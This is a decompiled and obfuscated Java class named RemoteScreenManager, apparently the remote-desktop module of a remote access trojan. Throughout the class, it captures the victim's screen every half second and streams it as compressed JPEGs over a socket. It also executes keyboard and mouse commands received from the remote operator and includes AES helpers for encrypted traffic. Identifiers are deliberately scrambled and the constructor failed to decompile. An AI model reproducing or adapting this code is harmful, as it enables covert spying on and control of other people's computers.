package carLambo;

import java.awt.Dimension;
import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.ImageObserver;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.util.Iterator;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.metadata.IIOMetadata;

public class RemoteScreenManager {
   private RobotImpl robot;
   private boolean sabretb;
   private OutputStream dfhttegd;
   private InputStream bsgshsbs;
   private Socket gsbthstgb;

   RemoteScreenManager(Socket param1) {
      // $FF: Couldn't be decompiled
   }

   // $FF: synthetic method
   private byte[] sdfsldf(BufferedImage var1) {
      try {
         Dimension var2 = new Dimension(var1.getWidth(), var1.getHeight());
         BufferedImage var10000;
         Image var5;
         if ((var5 = var1.getScaledInstance((int)((double)var2.width * 0.7D), (int)((double)var2.height * 0.7D), 4)) instanceof BufferedImage) {
            var10000 = (BufferedImage)var5;
         } else {
            var10000 = new BufferedImage(var5.getWidth((ImageObserver)null), var5.getHeight((ImageObserver)null), 1);
            Graphics2D var6;
            (var6 = var10000.createGraphics()).drawImage(var5, 0, 0, (ImageObserver)null);
            var6.dispose();
         }

         var1 = var10000;
         Iterator var7;
         if (!(var7 = ImageIO.getImageWritersByFormatName("jpg")).hasNext()) {
            throw new IllegalStateException("No writers found");
         } else {
            ImageWriter var8 = (ImageWriter)var7.next();
            ByteArrayOutputStream var3 = new ByteArrayOutputStream();
            ImageWriter var10 = var8;
            ImageWriter var10001 = var8;
            var8.setOutput(ImageIO.createImageOutputStream(var3));
            ImageWriteParam var9 = var8.getDefaultWriteParam();
            var9.setCompressionMode(2);
            var9.setCompressionQuality(0.3F);
            var10001.write((IIOMetadata)null, new IIOImage(var1, (List)null, (IIOMetadata)null), var9);
            var10.dispose();
            return var3.toByteArray();
         }
      } catch (Exception var4) {
         return null;
      }
   }

   // $FF: synthetic method
   private static int sdfsldf(int var0) {
      byte var1 = 0;
      switch(var0) {
      case 1:
         return 16;
      case 2:
         return 8;
      case 3:
         var1 = 4;
      default:
         return var1;
      }
   }

   // $FF: synthetic method
   private void sdfsldf(byte[] var1) {
      try {
         if (this.gsbthstgb.isConnected()) {
            OutputStream var2 = this.gsbthstgb.getOutputStream();
            var2.write((var1.length + "<>").getBytes());
            var2.write(var1);
            var2.flush();
            return;
         }
      } catch (Exception var3) {
         this.sabretb = false;
      }

   }

   // $FF: synthetic method
   private void sdfsldf() {
      while(true) {
         try {
            if (this.sabretb) {
               BufferedImage var1;
               if ((var1 = sabretb()) != null) {
                  byte[] var2 = this.sdfsldf(var1);
                  RemoteScreenManager var6 = this;

                  try {
                     if (var6.gsbthstgb.isConnected()) {
                        OutputStream var3 = var6.gsbthstgb.getOutputStream();
                        var3.write((var2.length + "<>").getBytes());
                        var3.write(var2);
                        var3.flush();
                     }
                  } catch (Exception var4) {
                     this.sabretb = false;
                  }

                  Thread.sleep(500L);
                  continue;
               }

               Thread.sleep(1000L);
               continue;
            }
         } catch (Exception var5) {
            ;
         }

         System.out.println("Exiting Remote Desktop...bye");
         return;
      }
   }

   // $FF: synthetic method
   private static BufferedImage sabretb() {
      try {
         return (new Robot()).createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
      } catch (Exception var0) {
         return null;
      }
   }

   // $FF: synthetic method
   private static BufferedImage sdfsldf(Image var0) {
      if (var0 instanceof BufferedImage) {
         return (BufferedImage)var0;
      } else {
         BufferedImage var10000 = new BufferedImage(var0.getWidth((ImageObserver)null), var0.getHeight((ImageObserver)null), 1);
         Graphics2D var1;
         (var1 = var10000.createGraphics()).drawImage(var0, 0, 0, (ImageObserver)null);
         var1.dispose();
         return var10000;
      }
   }

   // $FF: synthetic method
   private void dfhttegd() {
      while(true) {
         try {
            if (this.sabretb) {
               byte[] var1 = new byte[1];
               StringBuilder var3 = new StringBuilder();

               do {
                  int var2;
                  if ((var2 = this.bsgshsbs.read(var1, 0, 1)) == -1) {
                     throw new RuntimeException();
                  }

                  var3.append(new String(var1, 0, var2));
               } while(!var3.toString().endsWith("\r\n"));

               String var6 = var3.toString();
               String[] var7;
               if ((var7 = var6.substring(0, var6.indexOf("\r\n")).split("\\|"))[0].equals("key-event")) {
                  var6 = var7[1];
                  RobotImpl var5 = this.robot;
                  var5.sdfsldf(var6);
                  var5.sabretb(var6);
                  continue;
               }

               if (var7[0].equals("mouse-move")) {
                  this.robot.mouseMove(Integer.parseInt(var7[1]), Integer.parseInt(var7[2]));
                  continue;
               }

               if (var7[0].equals("mouse-wheel")) {
                  this.robot.mouseWheel(Integer.parseInt(var7[1]));
                  continue;
               }

               if (var7[0].equals("mouse-double")) {
                  this.robot.mouseMove(Integer.parseInt(var7[1]), Integer.parseInt(var7[2]));
                  this.robot.mousePress(sdfsldf(Integer.parseInt(var7[3])));
                  this.robot.mouseRelease(sdfsldf(Integer.parseInt(var7[3])));
                  this.robot.mousePress(sdfsldf(Integer.parseInt(var7[3])));
                  this.robot.mouseRelease(sdfsldf(Integer.parseInt(var7[3])));
                  continue;
               }

               if (var7[0].equals("mouse-left")) {
                  this.robot.mouseMove(Integer.parseInt(var7[1]), Integer.parseInt(var7[2]));
                  this.robot.mousePress(sdfsldf(Integer.parseInt(var7[3])));
                  this.robot.mouseRelease(sdfsldf(Integer.parseInt(var7[3])));
                  continue;
               }

               if (var7[0].equals("mouse-right")) {
                  this.robot.mouseMove(Integer.parseInt(var7[1]), Integer.parseInt(var7[2]));
                  this.robot.mousePress(sdfsldf(Integer.parseInt(var7[3])));
                  this.robot.mouseRelease(sdfsldf(Integer.parseInt(var7[3])));
               }
               continue;
            }
         } catch (Exception var4) {
            this.sabretb = false;
         }

         return;
      }
   }

   // $FF: synthetic method
   static void listener(RemoteScreenManager var0) {
      var0 = var0;

      try {
         while(var0.sabretb) {
            BufferedImage var1;
            if ((var1 = sabretb()) != null) {
               byte[] var2 = var0.sdfsldf(var1);
               RemoteScreenManager var6 = var0;

               try {
                  if (var6.gsbthstgb.isConnected()) {
                     OutputStream var3 = var6.gsbthstgb.getOutputStream();
                     var3.write((var2.length + "<>").getBytes());
                     var3.write(var2);
                     var3.flush();
                  }
               } catch (Exception var4) {
                  var0.sabretb = false;
               }

               Thread.sleep(500L);
            } else {
               Thread.sleep(1000L);
            }
         }
      } catch (Exception var5) {
         ;
      }

      System.out.println("Exiting Remote Desktop...bye");
   }

   // $FF: synthetic method
   static void readAndExecute(RemoteScreenManager remoteScreenManager) {
      remoteScreenManager = remoteScreenManager;

      try {
         while(remoteScreenManager.sabretb) {
            byte[] var1 = new byte[1];
            StringBuilder var3 = new StringBuilder();

            do {
               int var2;
               if ((var2 = remoteScreenManager.bsgshsbs.read(var1, 0, 1)) == -1) {
                  throw new RuntimeException();
               }

               var3.append(new String(var1, 0, var2));
            } while(!var3.toString().endsWith("\r\n"));

            String var6 = var3.toString();
            String[] var7;
            if ((var7 = var6.substring(0, var6.indexOf("\r\n")).split("\\|"))[0].equals("key-event")) {
               var6 = var7[1];
               RobotImpl var5 = remoteScreenManager.robot;
               var5.sdfsldf(var6);
               var5.sabretb(var6);
            } else if (var7[0].equals("mouse-move")) {
               remoteScreenManager.robot.mouseMove(Integer.parseInt(var7[1]), Integer.parseInt(var7[2]));
            } else if (var7[0].equals("mouse-wheel")) {
               remoteScreenManager.robot.mouseWheel(Integer.parseInt(var7[1]));
            } else if (var7[0].equals("mouse-double")) {
               remoteScreenManager.robot.mouseMove(Integer.parseInt(var7[1]), Integer.parseInt(var7[2]));
               remoteScreenManager.robot.mousePress(sdfsldf(Integer.parseInt(var7[3])));
               remoteScreenManager.robot.mouseRelease(sdfsldf(Integer.parseInt(var7[3])));
               remoteScreenManager.robot.mousePress(sdfsldf(Integer.parseInt(var7[3])));
               remoteScreenManager.robot.mouseRelease(sdfsldf(Integer.parseInt(var7[3])));
            } else if (var7[0].equals("mouse-left")) {
               remoteScreenManager.robot.mouseMove(Integer.parseInt(var7[1]), Integer.parseInt(var7[2]));
               remoteScreenManager.robot.mousePress(sdfsldf(Integer.parseInt(var7[3])));
               remoteScreenManager.robot.mouseRelease(sdfsldf(Integer.parseInt(var7[3])));
            } else if (var7[0].equals("mouse-right")) {
               remoteScreenManager.robot.mouseMove(Integer.parseInt(var7[1]), Integer.parseInt(var7[2]));
               remoteScreenManager.robot.mousePress(sdfsldf(Integer.parseInt(var7[3])));
               remoteScreenManager.robot.mouseRelease(sdfsldf(Integer.parseInt(var7[3])));
            }
         }
      } catch (Exception var4) {
         remoteScreenManager.sabretb = false;
      }

   }

   public static byte[] sdfsldf(String var0, byte[] var1) {
      try {
         SecureRandom var2 = new SecureRandom();
         byte[] var3 = new byte[16];
         var2.nextBytes(var3);
         SecretKey var6 = sabretb(var0, var3);
         Cipher var5 = Cipher.getInstance("AES/CBC/PKCS5PADDING");
         IvParameterSpec var4 = new IvParameterSpec(var3);
         var5.init(1, var6, var4);
         var1 = var5.doFinal(var1);
         ByteBuffer var7;
         (var7 = ByteBuffer.allocate(20 + var1.length)).putInt(16);
         var7.put(var3);
         var7.put(var1);
         return var7.array();
      } catch (Exception e) {
         throw new RuntimeException(e);
      }

   }

   public RemoteScreenManager() {
   }

   public static SecretKey sabretb(String var0, byte[] var1) {
      try {
         PBEKeySpec var2 = new PBEKeySpec(var0.toCharArray(), var1, 65536, 128);
         var1 = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(var2).getEncoded();
         return new SecretKeySpec(var1, "AES");
      } catch (Exception e) {
         throw new RuntimeException(e);
      }
   }

   public static byte[] encryptData(String var0, byte[] var1) {
      try {
         int var2;
         ByteBuffer var5;
         if ((var2 = (var5 = ByteBuffer.wrap(var1)).getInt()) >= 12 && var2 <= 16) {
            byte[] var6 = new byte[var2];
            var5.get(var6);
            SecretKey var4 = sabretb(var0, var6);
            var5.get(var1 = new byte[var5.remaining()]);
            Cipher var3 = Cipher.getInstance("AES/CBC/PKCS5PADDING");
            IvParameterSpec var7 = new IvParameterSpec(var6);
            var3.init(2, var4, var7);
            return var3.doFinal(var1);
         } else {
            throw new IllegalArgumentException("Nonce size is incorrect. Make sure that the incoming data is an AES encrypted file.");
         }
      } catch (Exception e) {
         throw new RuntimeException(e);
      }

   }
}
